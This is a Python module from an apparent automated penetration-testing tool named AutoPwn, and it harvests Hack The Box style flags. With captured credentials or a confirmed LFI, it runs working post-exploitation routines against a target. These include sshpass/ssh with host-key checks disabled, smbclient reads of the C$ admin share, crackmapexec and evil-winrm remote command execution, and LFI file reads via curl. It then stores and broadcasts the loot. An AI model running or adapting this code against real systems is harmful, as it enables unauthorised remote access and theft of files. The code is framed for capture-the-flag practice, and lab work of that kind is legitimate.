"""
flag_hunter.py — OS-aware flag harvesting for AutoPwn.

Strategies tried in order:
  1. SSH   (Linux)   — sshpass + ssh; reads /root/root.txt + find /home -name user.txt
  2. SMB   (Windows) — smbclient C$; reads Administrator/Desktop/root.txt + user desktops
  3. WinRM (Windows) — crackmapexec smb/winrm -x (if evil-winrm not enough)
  4. LFI   (any OS)  — curl against confirmed LFI URL → flag file paths
  5. Passive         — scan_output_for_flags() called with any raw tool output

All discovered flags are:
  • Persisted to the SQLite `flags` table (deduped by value)
  • Written to  data/loot/<job_id>/flags.txt   (human-readable log)
  • Written to  data/loot/<job_id>/root.txt     (just the hash, for easy submit)
             or data/loot/<job_id>/user.txt
  • Broadcast live over WebSocket as a `finding` event
"""
from __future__ import annotations

import asyncio
import datetime
import logging
import re
import shutil
import tempfile
from pathlib import Path
from typing import Optional

from ..core.event_bus import bus, make_finding, make_log
from ..database import crud
from ..database.session import AsyncSessionLocal

logger = logging.getLogger("autopwn.flag_hunter")

# ── paths ────────────────────────────────────────────────────────────────────
_REPO_ROOT = Path(__file__).parent.parent.parent   # autopwn/
LOOT_DIR   = _REPO_ROOT / "data" / "loot"

# ── flag regex ───────────────────────────────────────────────────────────────
# Matches standard 32-char MD5-like HTB hashes AND the HTB{...} format
FLAG_RE = re.compile(r"HTB\{[^}]+\}|[a-f0-9]{32}", re.IGNORECASE)

# ── OS fingerprint tables ────────────────────────────────────────────────────
_WIN_PORTS    = {135, 139, 445, 3389, 5985, 5986, 47001}
_WIN_SVCS     = {"msrpc", "microsoft-ds", "netbios-ssn", "ms-wbt-server", "wsman"}
_LINUX_PORTS  = {22}
_LINUX_SVCS   = {"ssh", "openssh"}

# ── flag file paths by OS ────────────────────────────────────────────────────
# (path, flag_type)   — '*' means wildcard; SSH uses `find`, LFI skips wildcards
FLAG_PATHS: dict[str, list[tuple[str, str]]] = {
    "linux": [
        ("/root/root.txt",               "root"),
        ("/root/flag.txt",               "root"),
        ("/home/*/user.txt",             "user"),
        ("/home/*/flag.txt",             "user"),
        ("/home/*/Desktop/user.txt",     "user"),
    ],
    "windows": [
        (r"C:\Users\Administrator\Desktop\root.txt",              "root"),
        (r"C:\Users\Administrator\Desktop\flag.txt",              "root"),
        (r"C:\Documents and Settings\Administrator\Desktop\root.txt", "root"),
        (r"C:\Users\*\Desktop\user.txt",                          "user"),
        (r"C:\Users\*\Desktop\flag.txt",                          "user"),
    ],
}


# ── public API ───────────────────────────────────────────────────────────────

def detect_os(nmap_result) -> str:
    """
    Return 'linux', 'windows', or 'unknown' based on nmap OS guess + service fingerprints.
    """
    if nmap_result.os_guess:
        g = nmap_result.os_guess.lower()
        if "windows" in g:
            return "windows"
        if any(x in g for x in ("linux", "ubuntu", "debian", "centos", "fedora",
                                  "rhel", "unix", "freebsd", "openbsd", "netbsd")):
            return "linux"

    open_ports = {p.port for p in nmap_result.ports if p.state == "open"}
    services   = {p.service.lower() for p in nmap_result.ports if p.state == "open"}

    win_score   = len(open_ports & _WIN_PORTS)   + len(services & _WIN_SVCS)
    linux_score = len(open_ports & _LINUX_PORTS) + len(services & _LINUX_SVCS)

    if win_score > linux_score:
        return "windows"
    if linux_score > 0:
        return "linux"
    return "unknown"


async def hunt_flags(
    job_id: str,
    target_ip: str,
    nmap_result,
    credentials: list[dict],
    findings: list[dict],
) -> list[dict]:
    """
    Main entry point.  Tries every retrieval method in order, deduplicates,
    and persists every unique flag found.  Returns list of flag dicts.
    """
    os_type = detect_os(nmap_result)
    await bus.publish(make_log(
        job_id,
        f"[FlagHunter] OS detected: {os_type} | credentials available: {len(credentials)}",
        phase="post_exploitation",
    ))

    found: list[dict] = []

    # ── 1. SSH (Linux / unknown) ──────────────────────────────────────────────
    if os_type in ("linux", "unknown"):
        ssh_ports = [
            p.port for p in nmap_result.ports
            if p.state == "open" and (p.port == 22 or "ssh" in p.service.lower())
        ]
        if ssh_ports:
            for cred in credentials:
                hits = await _ssh_read_flags(
                    job_id, target_ip, ssh_ports[0],
                    cred["username"], cred["password"],
                )
                for h in hits:
                    if not _seen(found, h["value"]):
                        found.append(h)
                        await _persist_flag(job_id, **h)
                if found:
                    break   # one working credential is enough
        else:
            await bus.publish(make_log(
                job_id, "[FlagHunter] No SSH port found — skipping SSH flag retrieval",
                phase="post_exploitation",
            ))

    # ── 2. SMB / WinRM (Windows / unknown) ───────────────────────────────────
    if os_type in ("windows", "unknown"):
        smb_ports   = [p.port for p in nmap_result.ports if p.state == "open" and p.port in (139, 445)]
        winrm_ports = [p.port for p in nmap_result.ports if p.state == "open" and p.port in (5985, 5986)]

        if smb_ports or winrm_ports:
            for cred in credentials:
                domain = cred.get("domain", "")
                if smb_ports:
                    hits = await _smb_read_flags(
                        job_id, target_ip, cred["username"], cred["password"], domain,
                    )
                    for h in hits:
                        if not _seen(found, h["value"]):
                            found.append(h)
                            await _persist_flag(job_id, **h)

                # If SMB didn't get everything, try CME (WinRM or SMB exec)
                if not found or not any(r["flag_type"] == "root" for r in found):
                    hits = await _cme_read_flags(
                        job_id, target_ip, cred["username"], cred["password"], domain,
                    )
                    for h in hits:
                        if not _seen(found, h["value"]):
                            found.append(h)
                            await _persist_flag(job_id, **h)

                if found:
                    break

    # ── 3. LFI-based (any OS) ────────────────────────────────────────────────
    lfi_findings = [f for f in findings if f.get("finding_type") == "lfi"]
    if lfi_findings:
        hits = await _lfi_read_flags(job_id, lfi_findings, os_type)
        for h in hits:
            if not _seen(found, h["value"]):
                found.append(h)
                await _persist_flag(job_id, **h)

    # ── summary ──────────────────────────────────────────────────────────────
    if found:
        await bus.publish(make_log(
            job_id,
            f"[FlagHunter] ★  {len(found)} flag(s) captured — "
            f"see data/loot/{job_id}/flags.txt",
            phase="post_exploitation",
        ))
    else:
        await bus.publish(make_log(
            job_id,
            "[FlagHunter] No flags retrieved automatically. "
            "Manual exploitation / shell access required.",
            phase="post_exploitation",
            level="warning",
        ))

    return found


async def scan_output_for_flags(
    job_id: str, output: str, source: str = "tool_output"
) -> None:
    """
    Passive scanner — call with *any* raw tool output to catch incidental flags.
    Safe to call multiple times; deduplicates against the DB.
    """
    async with AsyncSessionLocal() as session:
        existing = {f.value for f in await crud.get_flags(session, job_id)}

    for line in output.splitlines():
        for m in FLAG_RE.finditer(line):
            flag = m.group(0)
            if flag not in existing:
                flag_type = "root" if "root" in line.lower() else "user"
                await _persist_flag(job_id, flag, flag_type, source, "passive_scan")
                existing.add(flag)


# ── SSH ──────────────────────────────────────────────────────────────────────

async def _ssh_read_flags(
    job_id: str, target: str, port: int, username: str, password: str
) -> list[dict]:
    """Read flag files from a Linux target over SSH using sshpass."""
    if not shutil.which("sshpass"):
        await bus.publish(make_log(
            job_id,
            "[FlagHunter/SSH] sshpass not installed — apt install sshpass",
            phase="post_exploitation", level="warning",
        ))
        return []

    await bus.publish(make_log(
        job_id,
        f"[FlagHunter/SSH] Trying {username}@{target}:{port}",
        phase="post_exploitation",
    ))

    # One SSH call: find all candidate flag files and print @@FILE:<path> + content
    remote_cmd = (
        r"find /root /home -maxdepth 4 \( -name 'root.txt' -o -name 'user.txt' "
        r"-o -name 'flag.txt' \) 2>/dev/null "
        r"| while read f; do echo \"@@FILE:$f\"; cat \"$f\" 2>/dev/null; echo; done"
    )

    cmd = [
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-o", "LogLevel=ERROR",
        "-p", str(port),
        f"{username}@{target}",
        remote_cmd,
    ]

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
    except asyncio.TimeoutError:
        await bus.publish(make_log(
            job_id, f"[FlagHunter/SSH] Timed out connecting to {target}:{port}",
            phase="post_exploitation", level="warning",
        ))
        return []
    except Exception as e:
        logger.debug("[%s] SSH flag hunt exception: %s", job_id, e)
        return []

    err = stderr.decode(errors="replace").lower()
    if "permission denied" in err or "authentication failed" in err:
        await bus.publish(make_log(
            job_id,
            f"[FlagHunter/SSH] Auth failed for {username} — trying next credential",
            phase="post_exploitation",
        ))
        return []

    output = stdout.decode(errors="replace")
    results = _parse_file_blocks(output, "ssh")

    if results:
        await bus.publish(make_log(
            job_id,
            f"[FlagHunter/SSH] SSH success as {username} — {len(results)} flag(s) read",
            phase="post_exploitation",
        ))
    return results


# ── SMB ──────────────────────────────────────────────────────────────────────

# Fixed admin paths that don't need user enumeration
_SMB_ADMIN_PATHS: list[tuple[str, str, str]] = [
    # (share, relative_path, flag_type)
    ("C$", r"Users\Administrator\Desktop\root.txt",                          "root"),
    ("C$", r"Users\Administrator\Desktop\flag.txt",                          "root"),
    ("C$", r"Documents and Settings\Administrator\Desktop\root.txt",         "root"),
]
_SMB_USER_TEMPLATES = [
    r"Users\{user}\Desktop\user.txt",
    r"Users\{user}\Desktop\flag.txt",
]


async def _smb_read_flags(
    job_id: str, target: str, username: str, password: str, domain: str = ""
) -> list[dict]:
    """Read Windows flag files from SMB C$ share via smbclient."""
    if not shutil.which("smbclient"):
        return []

    auth = rf"{domain}\{username}%{password}" if domain else f"{username}%{password}"
    await bus.publish(make_log(
        job_id,
        f"[FlagHunter/SMB] Trying C$ as {username}@{target}",
        phase="post_exploitation",
    ))

    results: list[dict] = []
    tmpdir = Path(tempfile.mkdtemp(prefix="autopwn_flags_"))

    try:
        # 1. Fixed admin flag paths
        for share, rel_path, flag_type in _SMB_ADMIN_PATHS:
            local_file = tmpdir / f"flag_{len(results)}.txt"
            await _smbclient_get(target, share, auth, rel_path, local_file)
            if local_file.exists() and local_file.stat().st_size > 0:
                content = local_file.read_text(errors="replace").strip()
                _extract_flags(content, f"\\\\{target}\\{share}\\{rel_path}", flag_type, "smb", results)

        # 2. Enumerate user home directories for user flag
        users = await _smb_list_users(target, auth)
        await bus.publish(make_log(
            job_id,
            f"[FlagHunter/SMB] User directories found: {users or ['(none)']}",
            phase="post_exploitation",
        ))
        for user in users:
            for tmpl in _SMB_USER_TEMPLATES:
                rel_path = tmpl.replace("{user}", user)
                local_file = tmpdir / f"user_{user}_{len(results)}.txt"
                await _smbclient_get(target, "C$", auth, rel_path, local_file)
                if local_file.exists() and local_file.stat().st_size > 0:
                    content = local_file.read_text(errors="replace").strip()
                    _extract_flags(content, f"C:\\{rel_path}", "user", "smb", results)

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    if results:
        await bus.publish(make_log(
            job_id,
            f"[FlagHunter/SMB] SMB success — {len(results)} flag(s) read",
            phase="post_exploitation",
        ))
    return results


async def _smbclient_get(
    target: str, share: str, auth: str, rel_path: str, local_file: Path
) -> None:
    """Single smbclient GET command with timeout; silently ignores failures."""
    cmd = [
        "smbclient", f"//{target}/{share}",
        "-U", auth, "-N",
        "-c", f'get "{rel_path}" "{local_file}"',
    ]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await asyncio.wait_for(proc.communicate(), timeout=15)
    except Exception:
        pass


async def _smb_list_users(target: str, auth: str) -> list[str]:
    """List directories under C$\\Users to discover non-default user accounts."""
    cmd = [
        "smbclient", f"//{target}/C$",
        "-U", auth, "-N",
        "-c", r"ls Users\\",
    ]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
    except Exception:
        return []

    _SKIP = {".", "..", "Public", "Default", "Default User", "All Users", "Administrator"}
    users = []
    for line in stdout.decode(errors="replace").splitlines():
        parts = line.strip().split()
        # smbclient ls output:  "  Username  D  0  Mon Jan ..."
        if len(parts) >= 2 and parts[1] == "D" and parts[0] not in _SKIP:
            users.append(parts[0])
    return users


# ── CME / WinRM ──────────────────────────────────────────────────────────────

async def _cme_read_flags(
    job_id: str, target: str, username: str, password: str, domain: str = ""
) -> list[dict]:
    """
    Use crackmapexec (cme/nxc) to run a cmd one-liner on the target and extract flags.
    Tries SMB exec first, then WinRM.  Falls back to evil-winrm if cme is absent.
    """
    cme_bin = shutil.which("nxc") or shutil.which("crackmapexec") or shutil.which("cme")
    if not cme_bin:
        # Try evil-winrm as last resort
        return await _evil_winrm_read_flags(job_id, target, username, password)

    await bus.publish(make_log(
        job_id,
        f"[FlagHunter/CME] Trying remote exec as {username}@{target}",
        phase="post_exploitation",
    ))

    # cmd.exe one-liner: print @@FILE: marker then type the file
    win_cmd = (
        "cmd /c \"(if exist C:\\Users\\Administrator\\Desktop\\root.txt "
        "(echo @@FILE:C:\\Users\\Administrator\\Desktop\\root.txt && "
        "type C:\\Users\\Administrator\\Desktop\\root.txt)) && "
        "(for /D %u in (C:\\Users\\*) do "
        "(if exist C:\\Users\\%u\\Desktop\\user.txt "
        "(echo @@FILE:C:\\Users\\%u\\Desktop\\user.txt && "
        "type C:\\Users\\%u\\Desktop\\user.txt)))\""
    )

    results: list[dict] = []
    base_cmd = [cme_bin]
    if domain:
        base_cmd += ["-d", domain]

    for protocol in ("smb", "winrm"):
        cmd = base_cmd + [protocol, target, "-u", username, "-p", password, "-x", win_cmd]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=45)
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            logger.debug("[%s] CME %s error: %s", job_id, protocol, e)
            continue

        output = stdout.decode(errors="replace")
        hits = _parse_file_blocks(output, f"cme_{protocol}")
        for h in hits:
            if not _seen(results, h["value"]):
                results.append(h)

        if results:
            await bus.publish(make_log(
                job_id,
                f"[FlagHunter/CME] CME ({protocol}) success — {len(results)} flag(s) read",
                phase="post_exploitation",
            ))
            break

    return results


async def _evil_winrm_read_flags(
    job_id: str, target: str, username: str, password: str
) -> list[dict]:
    """Fallback: run a PowerShell script block via evil-winrm -s (script) mode."""
    if not shutil.which("evil-winrm"):
        return []

    await bus.publish(make_log(
        job_id,
        f"[FlagHunter/WinRM] Trying evil-winrm as {username}@{target}",
        phase="post_exploitation",
    ))

    # Write a tiny PS1 helper to a temp file
    ps_script = (
        "Get-ChildItem C:\\Users -Recurse -Depth 3 -ErrorAction SilentlyContinue "
        "-Include root.txt,user.txt,flag.txt | "
        "ForEach-Object { Write-Host \"@@FILE:$($_.FullName)\"; Get-Content $_ }"
    )
    tmpdir = Path(tempfile.mkdtemp(prefix="autopwn_ewrm_"))
    ps_file = tmpdir / "get_flags.ps1"
    ps_file.write_text(ps_script)

    cmd = [
        "evil-winrm",
        "-i", target,
        "-u", username,
        "-p", password,
        "-s", str(tmpdir),
        "-e", str(tmpdir),
    ]
    # evil-winrm is interactive; pipe the script invocation
    input_bytes = b"get_flags.ps1\nexit\n"
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(input=input_bytes), timeout=30)
    except Exception as e:
        logger.debug("[%s] evil-winrm error: %s", job_id, e)
        return []
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    output = stdout.decode(errors="replace")
    return _parse_file_blocks(output, "evil_winrm")


# ── LFI ──────────────────────────────────────────────────────────────────────

async def _lfi_read_flags(
    job_id: str, lfi_findings: list[dict], os_type: str
) -> list[dict]:
    """
    Use confirmed LFI findings to read flag files via curl.
    Skips wildcard paths (LFI can only read exact paths).
    """
    await bus.publish(make_log(
        job_id,
        f"[FlagHunter/LFI] {len(lfi_findings)} LFI finding(s) — attempting flag read",
        phase="post_exploitation",
    ))

    # Build path list for this OS; fall back to both if unknown
    if os_type == "unknown":
        paths = FLAG_PATHS["linux"] + FLAG_PATHS["windows"]
    else:
        paths = FLAG_PATHS.get(os_type, [])

    results: list[dict] = []

    for finding in lfi_findings[:3]:           # cap at 3 LFI vectors
        meta    = finding.get("metadata", {})
        lfi_url = meta.get("url", "")
        param   = meta.get("param", "file")
        if not lfi_url:
            continue

        for path, flag_type in paths:
            if "*" in path:
                continue                        # can't glob via LFI
            url = f"{lfi_url}?{param}={path}"
            try:
                proc = await asyncio.create_subprocess_exec(
                    "curl", "-sk", "--max-time", "8", url,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=12)
                body = stdout.decode(errors="replace")
                _extract_flags(body, path, flag_type, "lfi", results)
            except Exception as e:
                logger.debug("[%s] LFI flag read error for %s: %s", job_id, path, e)

    if results:
        await bus.publish(make_log(
            job_id,
            f"[FlagHunter/LFI] LFI flag read success — {len(results)} flag(s) found",
            phase="post_exploitation",
        ))
    return results


# ── helpers ──────────────────────────────────────────────────────────────────

def _seen(found: list[dict], value: str) -> bool:
    return any(f["value"] == value for f in found)


def _parse_file_blocks(output: str, method: str) -> list[dict]:
    """
    Parse output that contains @@FILE:<path> markers followed by file content.
    Also falls back to scanning the raw output for flag patterns if no markers found.
    """
    results: list[dict] = []
    current_path: Optional[str] = None
    current_lines: list[str] = []

    for line in output.splitlines():
        if line.lstrip().startswith("@@FILE:"):
            # flush previous block
            if current_path and current_lines:
                content = "\n".join(current_lines).strip()
                ft = "root" if "root" in current_path.lower() else "user"
                _extract_flags(content, current_path, ft, method, results)
            current_path = line.lstrip()[7:].strip()
            current_lines = []
        elif current_path is not None:
            current_lines.append(line)

    # flush last block
    if current_path and current_lines:
        content = "\n".join(current_lines).strip()
        ft = "root" if "root" in current_path.lower() else "user"
        _extract_flags(content, current_path, ft, method, results)

    # fallback: no markers — scan entire output
    if not results:
        for m in FLAG_RE.finditer(output):
            results.append({
                "value": m.group(0),
                "flag_type": "unknown",
                "path": f"{method}_output",
                "method": method,
            })

    return results


def _extract_flags(
    content: str, path: str, flag_type: str, method: str, results: list[dict]
) -> None:
    """Find all flag patterns in `content` and append to `results`."""
    for m in FLAG_RE.finditer(content):
        flag = m.group(0)
        if not _seen(results, flag):
            results.append({
                "value": flag,
                "flag_type": flag_type,
                "path": path,
                "method": method,
            })


# ── persistence ──────────────────────────────────────────────────────────────

async def _persist_flag(
    job_id: str,
    value: str,
    flag_type: str,
    path: str,
    method: str,
) -> None:
    """
    Write flag to:
      1. SQLite flags table (deduped)
      2. data/loot/<job_id>/flags.txt  — full log with timestamps
      3. data/loot/<job_id>/root.txt   — just the hash (for easy submit)
            or data/loot/<job_id>/user.txt
      4. WebSocket broadcast (make_finding)
    """
    # 1. Database (skip if already recorded)
    async with AsyncSessionLocal() as session:
        existing = await crud.get_flags(session, job_id)
        if any(f.value == value for f in existing):
            return
        await crud.add_flag(
            session, job_id=job_id,
            flag_type=flag_type, value=value, path=path,
        )

    # 2 & 3. Loot files
    loot_dir = LOOT_DIR / job_id
    loot_dir.mkdir(parents=True, exist_ok=True)

    ts = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    with (loot_dir / "flags.txt").open("a") as fh:
        fh.write(f"[{ts}] [{flag_type.upper()}] [{method}] {path}\n{value}\n\n")

    # Individual file (always overwrite with latest — one flag per type)
    safe_type = flag_type if flag_type in ("root", "user") else "unknown"
    (loot_dir / f"{safe_type}.txt").write_text(value + "\n")

    # 4. WebSocket broadcast
    await bus.publish(make_finding(
        job_id=job_id,
        phase="post_exploitation",
        finding_type="flag",
        value=value,
        severity="critical",
        metadata={
            "flag_type": flag_type,
            "path": path,
            "method": method,
        },
    ))

    logger.info("[%s] ★ FLAG [%s] via %s: %s  (%s)", job_id, flag_type, method, value, path)
    await bus.publish(make_log(
        job_id,
        f"[FlagHunter] ★  {flag_type.upper()} FLAG ({method}): {value}",
        phase="post_exploitation",
        level="info",
    ))
